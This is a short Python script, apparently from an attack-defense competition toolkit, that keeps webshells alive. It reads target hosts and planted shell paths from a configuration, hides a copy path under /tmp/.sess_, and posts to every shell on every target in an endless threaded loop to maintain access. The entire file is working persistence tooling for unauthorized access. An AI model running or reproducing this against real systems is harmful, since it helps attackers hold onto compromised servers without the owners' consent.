#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
sys.path.append("../..")
from utils import Utils

import requests
import threadpool

class ZooKeeper(object):
    def __init__(self, conf):
        self._conf = conf
        self._loc = ""
        for location in conf.shellLocations:
            temp = (conf.webRoot + "/" + location[1:]).replace('//','/')
            self._loc = self._loc + temp + "$"
        self._loc = "/tmp/.sess_e50ez827dpa4arh8m30b0d9b8c$" + self._loc[:-1]
        self._pool = threadpool.ThreadPool(20)

    def activate(self, target):
        for shell in self._conf.shellLocations:
            url = "http://{}{}".format(target, shell)
            data = {"loc": self._loc}
            try:
                print(url)
                print(data['loc'])
                requests.post(url=url, headers=self._conf.headers, data=data, timeout=1)
            except:
                pass
    
    def keepalive(self):
        params = []
        for target in self._conf.targets:
            params.append(([target], None))
        reqs = threadpool.makeRequests(self.activate, params, None)
        while True:
            [self._pool.putRequest(req) for req in reqs]
            self._pool.wait()

if __name__ == '__main__':
    from configuration import configuration
    keeper = ZooKeeper(configuration)
    keeper.keepalive()
    